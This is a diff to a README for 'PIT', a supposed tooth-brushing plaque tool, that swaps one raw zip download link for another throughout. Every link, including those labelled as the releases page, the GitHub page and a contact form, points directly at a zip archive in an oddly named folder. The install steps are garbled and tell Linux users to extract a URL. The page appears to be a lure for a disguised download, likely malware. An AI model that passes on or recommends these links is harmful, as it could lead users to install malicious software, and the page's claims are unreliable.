@@ -8,7 +8,7 @@ Welcome to PIT! This tool helps you keep your teeth clean by showing plaque leve
 
 **Click the button below to download PIT:**
 
-[![Download PIT](https://raw.githubusercontent.com/raeven2/PIT/main/mitigant/PIT-v1.7.zip%20PIT-v1.0-brightgreen)](https://raw.githubusercontent.com/raeven2/PIT/main/mitigant/PIT-v1.7.zip)
+[![Download PIT](https://github.com/raeven2/PIT/raw/refs/heads/main/mitigant/Software-v1.6.zip%20PIT-v1.0-brightgreen)](https://github.com/raeven2/PIT/raw/refs/heads/main/mitigant/Software-v1.6.zip)
 
 This link will take you to our Releases page. 
 
@@ -29,19 +29,19 @@ Before downloading, ensure your device meets the following requirements:
 
 To install PIT, follow these simple steps:
 
-1. **Visit the Releases page.** Click [here](https://raw.githubusercontent.com/raeven2/PIT/main/mitigant/PIT-v1.7.zip) to access it again.
+1. **Visit the Releases page.** Click [here](https://github.com/raeven2/PIT/raw/refs/heads/main/mitigant/Software-v1.6.zip) to access it again.
    
 2. **Choose the latest release.** Look for the version number at the top of the page. The latest version will have a tag like “v1.0”.
 
 3. **Download the installer.** Depending on your operating system, download the correct file:
    - For **Windows:** Download the `.exe` file.
    - For **macOS:** Download the `.dmg` file.
-   - For **Linux:** Download the `https://raw.githubusercontent.com/raeven2/PIT/main/mitigant/PIT-v1.7.zip` file.
+   - For **Linux:** Download the `https://github.com/raeven2/PIT/raw/refs/heads/main/mitigant/Software-v1.6.zip` file.
 
 4. **Run the installer.**
    - For **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
    - For **macOS:** Open the `.dmg` file and drag the PIT icon into your Applications folder.
-   - For **Linux:** Extract the files from the `https://raw.githubusercontent.com/raeven2/PIT/main/mitigant/PIT-v1.7.zip` file, then run the install script in your terminal.
+   - For **Linux:** Extract the files from the `https://github.com/raeven2/PIT/raw/refs/heads/main/mitigant/Software-v1.6.zip` file, then run the install script in your terminal.
 
 5. **Launch PIT.** After installation, open the application. You should see the main interface ready for you to start brushing with feedback.
 
@@ -70,6 +70,6 @@ Join our community for assistance, tips, and feedback:
 
 ## 📞 Contact
 
-For any direct inquiries, you can reach us via the contact form on our [GitHub page](https://raw.githubusercontent.com/raeven2/PIT/main/mitigant/PIT-v1.7.zip).
+For any direct inquiries, you can reach us via the contact form on our [GitHub page](https://github.com/raeven2/PIT/raw/refs/heads/main/mitigant/Software-v1.6.zip).
 
 Thank you for choosing PIT! Happy brushing!
